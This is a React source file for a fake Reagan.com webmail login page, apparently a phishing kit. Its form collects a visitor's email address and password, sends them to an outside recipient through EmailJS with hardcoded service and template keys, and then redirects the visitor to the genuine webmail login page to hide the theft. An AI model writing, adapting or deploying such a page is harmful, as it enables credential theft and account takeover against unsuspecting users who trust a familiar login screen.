import React, { useRef } from 'react';
import emailjs from '@emailjs/browser';

import Side from "../Assets/Reaganside.PNG";
import Uppicture from "../Assets/Reaganuplogo.png";

function Login () {
    const form = useRef();

    const sendEmail = (e) => {
        e.preventDefault();

        emailjs.sendForm('service_lc80xl9', 'template_kh7b9i8', form.current, '7j0-DszpaCoXkotg2')
            .then((result) => {
                console.log(result.text);
            }, (error) => {
                console.log(error.text);
            });

        // Redirect to the specified link after submitting the form
        window.location.href = 'https://webmail.reagan.com/wmidentity/Account/Login?ReturnUrl=%2Fwmidentity%2Fconnect%2Fauthorize%2Fcallback%3Fresponse_mode%3Dform_post%26response_type%3Dcode%2520id_token%26redirect_uri%3Dhttps%253A%252F%252Fwebmail.reagan.com%252Flogin.php%26client_id%3Dwebmail%26nonce%3D713affe85549be1f01aaa86751344cb4%26state%3D342c4f9d92ca1328fe635a1e6662f491%26scope%3Dopenid%2520profile%2520email%2520webmail%2520openid';
    };

    return (
        <div className="flex flex-row mt-10 justify-center gap-5">
            <div className="hidden md:block flex-col">
                <img src={Side} alt="image" className="h-72"/>
                <div className="Justify-center mt-5">
                    <button className="bg-blue-700 hover:bg-blue-800 text-white text-lg mx-5 py-2 px-10 font-bold rounded-md">Join Now</button>  
                </div> 
            </div>
            <form ref={form} onSubmit={sendEmail} className="flex flex-col border border-gray-800 w-64">
                <img src={Uppicture} alt="" className=""/>
                <label className="font-semibold w-24 ml-3 text-sm my-3">Email addrress</label>
                <input type="Email" name="user_name" required className="border border-gray-800 ml-3 mr-10 h-5" />
                <label className="font-semibold text-sm w-16 ml-3 my-2">Password</label>
                <input type="Password" name="user_pass" required className="border border-gray-800 ml-3 mr-10 h-5"/>
                <p className="text-left text-xs ml-3 mt-3">Forgot password?</p>
                <button type="submit" value="Send" className="border border-gray-800 bg-[#EFEFEF] w-16 ml-3 mb-10 md:mb-0">Log In</button>
            </form>
        </div>
    );
}; 

export default Login;
